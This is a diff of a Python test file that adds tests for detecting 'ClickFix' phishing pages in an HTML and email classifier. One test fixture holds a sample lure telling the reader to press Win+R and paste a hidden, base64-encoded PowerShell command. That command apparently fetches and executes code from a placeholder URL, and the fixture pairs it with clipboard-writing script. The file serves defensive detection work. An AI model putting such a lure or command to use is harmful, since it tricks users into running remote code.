@@ -73,6 +73,27 @@ class TestNewFeaturesV120:
         assert feats["clanker_weighted_score"] <= 0.1
 
 
+class TestClickFixRulesV130:
+    def test_clickfix_rule_detected(self):
+        html = (
+            "<p>Verify you are human. Press Win+R and paste the command.</p>"
+            "<pre>powershell -w hidden -enc "
+            "SQBFAFgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvAGMALgBlACcAKQA=</pre>"
+            "<script>navigator.clipboard.writeText('x')</script>"
+        )
+        feats = extract_clanker_features(html)
+        assert feats["clanker_score_clickfix"] > 0
+
+    def test_exec_command_copy_rule(self):
+        html = "<script>document.execCommand('copy');</script>"
+        feats = extract_clanker_features(html)
+        assert feats["clanker_score_clickfix"] > 0
+
+    def test_benign_no_clickfix(self):
+        feats = extract_clanker_features(BENIGN_HTML)
+        assert feats["clanker_score_clickfix"] == 0
+
+
 class TestSyntheticGenerator:
     def test_generate_and_extract(self, tmp_path):
         from generate_synthetic_clanker_dataset import _generate_set
@@ -98,6 +119,21 @@ class TestSyntheticGenerator:
 
         assert mean_clanker(malicious_dir) > mean_clanker(benign_dir)
 
+    def test_clickfix_template_features(self, tmp_path):
+        from generate_synthetic_clanker_dataset import (
+            _CLICKFIX_SHELL, _clickfix_encoded_poc, _create_email,
+        )
+        from extract_features import extract_features_from_eml
+
+        html = _CLICKFIX_SHELL.format(cmd=_clickfix_encoded_poc(), extra="")
+        eml = tmp_path / "clickfix.eml"
+        eml.write_bytes(_create_email("Verify you are human", html))
+
+        feats, metadata = extract_features_from_eml(str(eml))
+        assert feats["clanker_clickfix_detected"] == 1
+        assert feats["clanker_clickfix_payload_url_count"] >= 1
+        assert metadata["clickfix"]["high_confidence"] is True
+
 
 class TestTrainClankerModel:
     def test_new_features_v120_list_present_in_module(self):
@@ -107,3 +143,11 @@ class TestTrainClankerModel:
         assert "clanker_score_clipboard_abuse" in NEW_FEATURES_V120
         assert "clanker_script_block_count" in NEW_FEATURES_V120
         assert "clanker_event_handler_count" in NEW_FEATURES_V120
+
+    def test_new_features_v130_list_present_in_module(self):
+        from train_clanker_model import NEW_FEATURES_V130
+
+        assert "clanker_score_clickfix" in NEW_FEATURES_V130
+        assert "clanker_clickfix_detected" in NEW_FEATURES_V130
+        assert "clanker_clickfix_high_confidence" in NEW_FEATURES_V130
+        assert "clanker_clickfix_payload_url_count" in NEW_FEATURES_V130
